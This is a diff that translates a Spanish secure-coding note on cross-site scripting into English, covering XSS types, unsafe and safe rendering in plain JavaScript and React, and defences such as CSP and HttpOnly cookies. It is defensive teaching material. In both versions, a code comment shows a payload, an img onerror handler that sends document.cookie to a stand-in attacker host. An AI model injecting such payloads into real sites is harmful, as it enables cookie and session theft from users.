@@ -1,40 +1,40 @@
 # XSS (Cross-Site Scripting)
 
-Inyectar JavaScript malicioso en una página que van a ver otros usuarios, para que corra en el navegador de la víctima con los mismos permisos que el sitio legítimo — puede robar cookies sin `HttpOnly`, leer tokens de `localStorage`, o hacer requests en nombre del usuario logueado.
+Injecting malicious JavaScript into a page other users will view, so it runs in the victim's browser with the same permissions as the legitimate site — it can steal cookies without `HttpOnly`, read tokens from `localStorage`, or make requests on behalf of the logged-in user.
 
-## Tipos
+## Types
 
-- **Stored**: el payload queda guardado en el servidor (ej. el texto de un comentario) y se sirve a todos los que visitan esa página — el más peligroso, porque afecta a cualquiera sin que el atacante tenga que hacer nada más.
-- **Reflected**: el payload viaja en la URL o el body de un request y el servidor lo devuelve tal cual en la respuesta, sin persistirlo — requiere que la víctima haga click en un link armado por el atacante.
-- **DOM-based**: la vulnerabilidad está enteramente del lado del cliente — JavaScript que toma datos no confiables (la URL, un input) y los mete en el DOM sin pasar nunca por el servidor.
+- **Stored**: the payload stays saved on the server (e.g. a comment's text) and gets served to everyone who visits that page — the most dangerous, because it affects anyone with no further action from the attacker.
+- **Reflected**: the payload travels in the URL or a request's body and the server returns it as-is in the response, without persisting it — requires the victim to click a link crafted by the attacker.
+- **DOM-based**: the vulnerability is entirely client-side — JavaScript that takes untrusted data (the URL, an input) and puts it into the DOM without ever going through the server.
 
-## El problema de fondo: tratar datos como si fueran código
+## The underlying problem: treating data as if it were code
 
 ```js
-// ❌ vulnerable: el navegador interpreta lo que hay adentro como HTML real
-elemento.innerHTML = comentarioDelUsuario;
-// si comentarioDelUsuario = '<img src=x onerror="fetch(`https://atacante.com?c=${document.cookie}`)">'
-// esa imagen rota dispara el script apenas se renderiza
+// ❌ vulnerable: the browser interprets what's inside as real HTML
+element.innerHTML = userComment;
+// if userComment = '<img src=x onerror="fetch(`https://attacker.com?c=${document.cookie}`)">'
+// that broken image fires the script as soon as it renders
 
-// ✅ seguro: se inserta como texto plano, el navegador no lo ejecuta
-elemento.textContent = comentarioDelUsuario;
+// ✅ safe: inserted as plain text, the browser doesn't execute it
+element.textContent = userComment;
 ```
 
-React escapa automáticamente cualquier valor que renderices como texto — pero `dangerouslySetInnerHTML` existe justamente para saltarse esa protección, y hay que tratarlo como una operación de riesgo:
+React automatically escapes any value you render as text — but `dangerouslySetInnerHTML` exists precisely to bypass that protection, and it has to be treated as a risky operation:
 
 ```jsx
-// ❌ dangerouslySetInnerHTML bypassea el escape automático de React
-<div dangerouslySetInnerHTML={{ __html: comentarioDelUsuario }} />
+// ❌ dangerouslySetInnerHTML bypasses React's automatic escaping
+<div dangerouslySetInnerHTML={{ __html: userComment }} />
 
-// ✅ React escapa el contenido solo — nunca se interpreta como HTML
-<div>{comentarioDelUsuario}</div>
+// ✅ React escapes the content on its own — never interpreted as HTML
+<div>{userComment}</div>
 ```
 
-## Cómo se previene
+## How it's prevented
 
-- **Escapar por default**: cualquier dato que venga de un usuario (o de una fuente externa) se trata como texto, nunca como HTML, salvo que se sanitice explícitamente con una librería para eso.
-- **Content-Security-Policy**: restringe de qué orígenes puede cargar/ejecutar scripts la página — mitiga el impacto aunque el escape falle en algún lugar puntual (ver [Security Headers](security-headers.md#content-security-policy-csp)).
-- **`HttpOnly` en cookies sensibles**: no evita el XSS en sí, pero limita el daño — el script inyectado no puede leer una cookie que el navegador no expone a JavaScript (ver [Autenticación](../backend/autenticacion.md#8-dónde-guardar-el-token-en-el-cliente)).
+- **Escape by default**: any data coming from a user (or an external source) is treated as text, never as HTML, unless it's explicitly sanitized with a library built for that.
+- **Content-Security-Policy**: restricts which origins the page can load/execute scripts from — mitigates the impact even if escaping fails somewhere specific (see [Security Headers](security-headers.md#content-security-policy-csp)).
+- **`HttpOnly` on sensitive cookies**: doesn't prevent the XSS itself, but limits the damage — the injected script can't read a cookie the browser doesn't expose to JavaScript (see [Authentication](../backend/authentication.md#8-where-to-store-the-token-on-the-client)).
 
 ---
-Relacionado: [CSRF](csrf.md), [Security Headers](security-headers.md), [Autenticación y Seguridad](../backend/autenticacion.md), [Almacenamiento en el cliente](../frontend-react/almacenamiento-cliente.md).
+Related: [CSRF](csrf.md), [Security Headers](security-headers.md), [Authentication and Security](../backend/authentication.md), [Client-side storage](../frontend-react/client-side-storage.md).
